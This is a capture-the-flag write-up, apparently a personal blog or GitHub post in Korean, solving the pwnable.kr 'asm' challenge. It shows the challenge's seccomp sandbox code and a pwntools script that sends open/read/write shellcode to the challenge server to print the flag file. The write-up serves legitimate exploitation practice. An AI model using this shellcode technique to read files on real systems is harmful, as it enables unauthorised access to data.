# [pwnable.kr] asm

> Mommy! I think I know how to make shellcodes
>
> ssh asm@pwnable.kr -p2222 (pw: guest)

## Analysis

![image](https://github.com/user-attachments/assets/7c15b029-f8aa-440c-af79-d92d9f008b09)

```c
/* asm.c */

void sandbox(){
    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
    if (ctx == NULL) {
        printf("seccomp error\n");
        exit(0);
    }

    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

    if (seccomp_load(ctx) < 0){
        seccomp_release(ctx);
        printf("seccomp error\n");
        exit(0);
    }
    seccomp_release(ctx);
}
```

`rsp`와 `rip`를 제외한 모든 레지스터가 초기화된 상태에서, `open`, `read`, `write`, `exit`, `exit_group` system call만 사용하여 플래그 파일의 내용을 읽어야 한다.

## Exploit

```python
# ex.py

from pwn import *

context(arch="amd64")

r = remote("pwnable.kr", 9026)

flag_filename = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"

shellcode = shellcraft.open(flag_filename)
shellcode += shellcraft.read("rax", 0x41414F00, 0x100)
shellcode += shellcraft.write(1, 0x41414F00, 0x100)
shellcode = asm(shellcode)

r.sendafter(b"give me your x64 shellcode: ", shellcode)

r.interactive()
```

![image](https://github.com/user-attachments/assets/48400fc6-0e69-425a-aab6-4fa5719de826)
